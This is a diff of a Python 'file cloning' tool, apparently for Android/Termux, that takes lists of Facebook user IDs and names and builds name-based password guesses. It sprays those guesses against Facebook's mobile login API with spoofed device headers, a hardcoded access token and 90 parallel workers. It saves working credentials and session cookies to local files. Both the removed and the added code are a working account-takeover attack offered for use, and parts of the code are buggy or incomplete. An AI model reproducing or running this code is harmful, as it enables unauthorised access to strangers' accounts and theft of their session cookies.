-                        sim_id+=fbcr
-        else:
-                fbcr = 'Banglalink'
-                sim_id+=fbcr
-except:
-        fbcr = "Banglalink"
-device = {
-        'android_version':android_version,
-        'model':model,
-        'build':build,
-        'fblc':fblc,
-        'fbmf':fbmf,
-        'fbbd':fbbd,
-        'fbdv':model,
-        'fbsv':fbsv,
-        'fbca':fbca,
-        'fbdm':fbdm}
+#__________________[ SYS ]__________________#
+os.system('xdg-open https://www.facebook.com/MR.xbow.404')
+sys.stdout.write('\x1b]2; xbow-XD\x07')
+head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
+#__________________[ COLOUR ]__________________#
+A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';M = '\x1b[38;5;205m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';G = '\x1b[38;5;48m'
+orange = "\x1b[38;5;196m"
+yellow = "\x1b[38;5;208m"
+black="\033[1;30m"
+rad="\x1b[38;5;160m"
+green="\x1b[38;5;46m"
+yelloww="\033[1;33m"
+blue="\033[38;5;6m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+white="\033[1;37m"
+faltu = "\033[1;47m"
+pvt = "\033[1;0m"
+gren = "\x1b[38;5;154m"
+gas = "\033[1;32m"
+my_color = [white,blue,green];warna = random.choice(my_color) 
 
-def useragent():
-    fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
-    enCRACK1 = ['en_GB','en_US']
-    CRACKfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
-    CRACKsim1 = [ 'Banglalink', 'Grameenphone', 'Robi', 'Airtel','Teletalk']
-    modelxxx =  ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
-    gtt =random.choice(modelxxx)
-    android_version=str(random.randrange(6,13))
-    fbav = str(random.randint(111,111))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))+'.'+str(random.randint(111,999))
-    fbbv = str(random.randint(111111111,999999999))
-    lc = random.choice(enCRACK1)
-    cr = random.choice(CRACKsim1)
-    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM/{{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
-    return CRACK_ua
+#__________________[ LINEX ]__________________#
+def clear():os.system('clear');print(logo)
+looood("")
+def linex():print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+#__________________[ LOGO. ..]__________________#
+logo =f"""
+{green}▞▀▖▛▀▖▙ ▌▞▀▖▙ ▌  ▞▀▖▌ ▌▙▗▌▛▀▘▛▀▖
+{green}▙▄▌▌ ▌▌▌▌▙▄▌▌▌▌  ▙▄▌▙▄▌▌▘▌▙▄▖▌ ▌
+{green}▌ ▌▌ ▌▌▝▌▌ ▌▌▝▌  ▌ ▌▌ ▌▌ ▌▌  ▌ ▌
+{green}▘ ▘▀▀ ▘ ▘▘ ▘▘ ▘  ▘ ▘▘ ▘▘ ▘▀▀▘▀▀  {white}V{green}/{white}6.6
+{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{rad}[{white}◆{rad}] {green}FACEBOOK  {white}➣{green}  xbow WASIF SHAKIL
+{rad}[{white}◆{rad}] {green}TOOLTYPE  {white}➣{green}  FREE{white}{rad}┼{faltu}{rad}FILE & RANDOM{pvt}{green}{rad}┼ 
+{rad}[{white}◆{rad}] {green}GITHUB    {white}➣{white}   ({gren}xbow-570{white})
+{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+#__________________[ RESULT ]__________________#
+def result(OKs,cps):
+    if len(OKs) != 0 or len(cps) != 0:
+        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+        print(f'{rad}[{white}◆{rad}] {green}THE PROCESS HAS BEEN COMPLETED...')
+        print(f'{rad}[{white}◆{rad}] {green}TOTAL OK {white}➣{green} %s' % str(len(oks)))
+        print(f'{rad}[{white}◆{rad}] {green}TOTAL CP {white}➣{rad} %s' % str(len(cps)))
+        print(f'\r{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ')
+        input(f"{rad}[{white}◆{rad}] {green}PRESS ENTER TO BACK MENU ")
+        exit()
 
-#M2 UA
-def uaa():
-    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.9,width=1080,height=1920};FBLC/lt_LT;FBCR/GRAMMENPHONE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SPH-L720;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
+#__________________[ MENU ]__________________#
+def menu():   
+    clear()
+    print(f'{rad}[{white}1{rad}] {green}START FILE CLONE')
+    print(f'{rad}[{white}2{rad}] {green}START RANDOM CLONE  {rad}({white}COMMING SOON{rad})')
+    print(f'{rad}[{white}3{rad}] {green}JOIN WHATSAPP GROUPE')
+    print(f'{rad}[{white}4{rad}] {green}CONTAC TOOL ADMIN')
+    print(f'{rad}[{white}0{rad}] {gren}EXIT MENU  ')
+    linex()
+    select = input(f'{rad}[{white}◆{rad}] {green}CHOICE OPTION {white}➣{green} ')
+    if select =='1':
+        _file_()
+    elif select =='2':
+    	_file_()
+    elif select =='3':
+        os.system('xdg-open https://chat.whatsapp.com/Bd8RQc6VoKxLOO9ljc5Raj');menu()
+    elif select =='4':
+        os.system('xdg-open https://www.facebook.com/MR.xbow.404');menu()
+    elif select =='0':
+        exit(f'{green}[{rad}+{green}] SUCCESFULLY EXIT DONE ')
+    else:
+        print(f'{G1}[{A}={G2}]{G2} VALID OPTION')
+        time.sleep(2)
+        menu()
 
-logo=(f"""\
- __  __     ____   _____        __
-\033[96;1m \ \/ /    | __ ) / _ \ \      / /
-\033[96;1m  \  /_____|  _ \| | | \ \ /\ / / 
-\033[97;1m  /  \_____| |_) | |_| |\ V  V /  
- /_/\_\    |____/ \___/  \_/\_/      \033[92;1m inc3
-\033[1;37m----------------------------------------------
- [•] Author     :  INCEPTION👾
- [•] Github     :  inception-09
- [•] Tool       :  In Development
- [•] Version    :  Debug 2
-\033[1;37m----------------------------------------------""")
-def linex():
-	print('\033[1;37m----------------------------------------------')
-def clear():
-	os.system('clear')
-	print(logo)
-A = '\x1b[1;97m' 
-B = '\x1b[1;96m' 
-C = '\x1b[1;91m' 
-D = '\x1b[1;92m'
-M = '\033[1;31m'
-H = '\033[1;32m'
-N = '\x1b[1;37m'	
-E = '\x1b[1;93m' 
-F = '\x1b[1;94m'
-G = '\x1b[1;95m'
-P = '\033[1;37m'
-def cek_apk(session,coki):
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
-	else:
-		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-	sop = BeautifulSoup(w,"html.parser")
-	x = sop.find("form",method="post")
-	game = [i.text for i in x.find_all("h3")]
-	if len(game)==0:
-		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
-	else:
-		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
-		for i in range(len(game)):
-			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
-loop=0
-oks=[]
-cps=[]
-pcp=[]
-id=[]
-tokenku=[]
-def pp():
-	try:
-			ky = open('/sdcard/Android/.nonmedia.js','r').read()
-	except(FileNotFoundError):
-			op = uuid.uuid1().hex.upper()
-			open('/sdcard/Android/.nonmedia.js','w').write(op)
-			pp()
-	except(KeyError,OSError,IOError):
-			linex()
-			os.system('termux-setup-storage')
-			print(' [×] allow storage permission ')
-			pp()
-def menu():
-			pp()
-			clear()
-		#	linex()
-			print(' [1] File cloning\n [2] Random cloning \n [3] join whatsap group \n [0] Exit menu')
-			linex()
-			xd=input(' Choose an option: ')
-		#	os.system('xdg-open)
-			if xd in ['1','01']:
-				clear()
-				print(' Put file example:  /sdcard/File.txt  etc..')
-				linex()
-				file = input(' Put file path\033[1;37m: ')
-				try:
-					fo = open(file,'r').read().splitlines()
-				except FileNotFoundError:
-					print(' File location not found ')
-					time.sleep(1)
-					menu()
-				clear()
-				
-				plist = []
-				try:
-					ps_limit = int(input(' How many passwords do you want to add ? '))
-				except:
-					ps_limit =1
-				clear()
-				print('\033[1;32m exp: first last,firtslast,first123')
-				linex()
-				for i in range(ps_limit):
-					plist.append(input(f' Put password {i+1}: '))
-				clear()
-				print(' Do you went show cp account? (y/n): ')
-				linex()
-				cx=input(' Choose: ')
-				if cx in ['y','Y','yes','Yes','1']:
-					pcp.append('y')
-				else:
-					pcp.append('n')
-				clear()
-				print(' [1] Method M1 \n [2] Method M2 \n [3] Method M3')
-				linex()
-				mth = input(' Choose : ')
-				with tred(max_workers=90) as crack_submit:
-					clear()
-					total_ids = str(len(fo))
-					print(' Total account ids : \033[1;32m'+total_ids+f' ')
-					print(' \033[1;37mThe process is running in the background')
-					linex()
-					for user in fo:
-						ids,names = user.split('|')
-						passlist = plist
-						if mth =='1':
-							crack_submit.submit(api2,ids,names,passlist)
-						elif mth =='2':
-							crack_submit.submit(api,ids,names,passlist)
-						elif mth == '3':
-							crack_submit.submit(api3,ids,names,passlist)
-						else:
-							crack_submit.submit(api,ids,names,passlist)
-				print('\033[1;37m')
-				linex()
-				print(' The process has completed')
-				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
-				linex()
-				input(' Press enter to back ')
-				os.system('python xbow.py')
-			elif xd in ['2','02']:
-				pak()
-			elif xd in ['3','03']:
-				os.system('xdg-open https://chat.whatsapp.com/')
-				menu()
-			elif xd in ['0','00']:
-				exit(' Thanks for use 🥰 ')
-			else:
-				exit(' Option not found in menu...')
+def _file_():
+    global methods
+    clear()
+    print(f'{rad}[{white}◆{rad}] {green}METHOD - 1')
+    print(f'{rad}[{white}◆{rad}] {green}METHOD - 2')
+    linex()
+    option = input(f'{rad}[{white}◆{rad}] {green} CHOICE OPTION {rad}➣{green} ')
+    if option =='1':
+        methods.append('methodA')
+        main_crack().crack(id)
+    elif option =='2':
+        methods.append('methodB')
+        main_crack().crack(id)
+    elif option =='3':
+        methods.append('methodC')
+        main_crack().crack(id)
+    elif option =='0':
+        _file_()
+    else:
+      print(f'{green}[{rad}+{green}] VALID OPTION')
+      time.sleep(2)
+      _file_()
 
-def api(ids,names,passlist):
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        clear()
+        print(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}➣{green} /sdcard/xbow.txt');linex()
+        self.file = input(f'{rad}[{white}◆{rad}]{green} FILE NAME {rad}➣{green} ')
         try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [XBOW-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())                        
-                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
-                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:                                       
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        ##print("\r\r\033[1;33m Cookie: "+coki)
-                                        print('\r\r\033[1;32m [XBOW-OK] '+ids+' | '+pas+' | '+coki+'\033[1;97m')
-                                        open('/sdcard/XBOW-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/XBOW-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[XBOW-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
-                                        sys.stdout.write('\r\r\033[1;31m [XBOW-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [XBOW-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/XBOW-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/XBOW-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print(f'{green}[{rad}+{green}] OPPS FILE NOT FOUND ...')
+            time.sleep(2)
+            os.system('clear')
+            print(logo)
+            print(f'{green}[{rad}+{green}] TRY AGAIN ...')
+            time.sleep(2)
+            main_crack().crack(id)
+#__________________[ FILE METHOD M1 ]__________________#           
+    def methodA(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r{rad}[{green}xbow-M1{rad}]{white}-{rad}[{gren}{loop}{rad}]{white}-{rad}[{green}OK{rad}]{white}-{rad}[{green}{len(oks)}{rad}] ") 
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:       
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": sid,
+                    "password": ps,
+                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': S1(),
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"{ckkk}"
+                    print(f"\r\r{rad}[{green}xbow-OK{rad}] {green}{sid} {rad}-{green} {ps} ")
+                    print(f'\r\r{green}-[💉]-{white} {cookie}''\n')
+                    open('/sdcard/xbow-M1-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    oks.append(sid)
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                     ##print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
+                     open('/sdcard/xbow--CP.txt','a').write(sid+'|'+ps+'\n')
+                     cps.append(sid)
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            self.methodA(sid, name, ps) 
+#__________________[ FILE METHOD M2 ]__________________#             
+    def methodB(self, sid, name, psw):
+        try:
+            global oks,cps,loop
+            sys.stdout.write(f"\r{rad}[{green}xbow-M2{rad}]{white}-{rad}[{gren}{loop}{rad}]{white}-{rad}[{green}OK{rad}]{white}-{rad}[{green}{len(oks)}{rad}] ") 
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": sid,
+                    "password": ps,
+                    "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": str(uuid.uuid4()),
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': S2(),
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]); SMILEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"{ckkk}"
+                    print(f"\r\r{rad}[{green}xbow-OK{rad}] {green}{sid} {rad}-{green} {ps} ")
+                    print(f'\r\r{green}-[💉]-{white} {cookie}''\n')
+                    open('/sdcard/xbow-M2-COOKIE.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
+                    oks.append(sid)
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    ##print(f"\r\r{black}[xbow-CP] • {sid} - {ps} ")
+                    open('/sdcard/xbow-CP.txt','a').write(sid+'|'+ps+'\n')
+                    cps.append(sid)
+                else:
+                    continue
+            loop+=1
         except requests.exceptions.ConnectionError:
             time.sleep(20)
-        except Exception as e:
-                pass
+            self.methodC(sid, name, ps) 
+            
+#__________________[ PASSWORD ]__________________#
+    def pasw(self):       
+            pw = []
+            clear()
+            print(f'{rad}[{white}◆{rad}] {green}NOOT LAST LIMIT 20 PASSWORD');linex()
+            sl = int(input(f'{rad}[{white}◆{rad}] {green}PASSWORD LIMIT {rad}➣{green} '))
+            clear()
+            print(f'{rad}[{white}◆{rad}] {green}EXAMPLE {rad}➣{green} first123/firstlast/first@@@')
+            linex()
+            if sl =='':
+                print(f'{S}[{R}={G5}]{S} PUT LIMIT BETWEEN 1 TO 30')
+            elif sl > 20:
+                print(f'{G5}[{R}={G5}]{S} PASSWORD LIMIT SHOULD NOT BE GREATER THAN 30')
+            else:
+                for sr in range(sl):
+                    pw.append(input(f'{rad}[{white}◆{rad}] {green}PASSWORD NO {white}{sr+1} {rad}➣{green} '))
+            clear()
+            print(f'{rad}[{white}◆{rad}] {green}TOTAL UID  {white}➣{gren} %s ' % len(self.id))
+            print(f'{rad}[{white}◆{rad}] {green}IF NO RESULT {rad}({white}ON{green}/{white}OF{rad}){green} AIRPLAN MOOD')
+            linex()
+            with Habib(max_workers=90) as AJworld:
+                for zsb in self.id:
+                   try:
+                       uid, name = zsb.split('|')
+                       sz = name.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
+                           pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:
+                                AJworld.submit(self.methodA, uid, name, pwx)
+                            elif 'methodB' in methods:
+                                AJworld.submit(self.methodB, uid, name, pwx)
+                            elif 'methodC' in methods:
+                                AJworld.submit(self.methodC, uid, name, pwx)
+                   except:pass
+            result(oks,cps)
 
-def api3(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [XBOW-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBILE.LTE', 'MODERATE', 'Fiber', 'DSL', 'Satellite', 'Dial-up', 'Fixed Wireless', 'Cable', 'WiMAX'])}"
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
-                        data = {"adid": str(uuid.uuid4()),
-                            "format": "json",
-                            "device_id": str(uuid.uuid4()),
-                            "cpl": "true",
-                            "family_device_id": str(uuid.uuid4()),
-                            "credentials_type": "device_based_login_password",
-                            "error_detail_type": "button_with_disabled",
-                            "source": "register_api",
-                            "email": ids,
-                            "password": pas,
-                            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                            "generate_session_cookies": "1",
-                            "meta_inf_fbmeta": "NO_FILE",
-                            "etag":  random.choice(["fcc627766b9d33fa48c7e547d58e96e803c0f5c9", "28cce2d103004681314834a51898159392bd689c","682f553f4392d534c8bd9b9560e891fd6ae7c7e0", "01e11e2774574e9947c56db4ccd2c20c7c7aad08", "cbb9d287bcb664913899541d5fd35b0582c33964"]),
-                            "advertiser_id": str(uuid.uuid4()),
-                            "currently_logged_in_userid": "0",
-                            "locale": "en_US",
-                            "client_country_code": "US",
-                            "method": "auth.login",
-                            "fb_api_req_friendly_name": "authenticate",
-                            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                            "api_key": "882a8490361da98702bf97a021ddc14d"}
-                        headers = {'User-Agent': uaa(),
-                            'Content-Type': 'application/x-www-form-urlencoded',
-                            'Host': 'graph.facebook.com',
-                            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-                            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-                            'X-FB-Connection-Type': f'{SEX}',
-                            'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
-                            'X-FB-Connection-Quality':f'{SEX}',
-                            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-                            'X-Tigon-Is-Retry': 'False',
-                            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                            'x-fb-device-group': '5120',
-                            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                            'X-FB-Request-Analytics-Tags': 'graphservice',
-                            'X-FB-HTTP-Engine': 'Liger',
-                            'X-FB-Client-IP': 'True',
-                            'X-FB-Server-Cluster': 'True',
-                            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [XBOW-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/XBOW-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/XBOW-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[XBOW-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
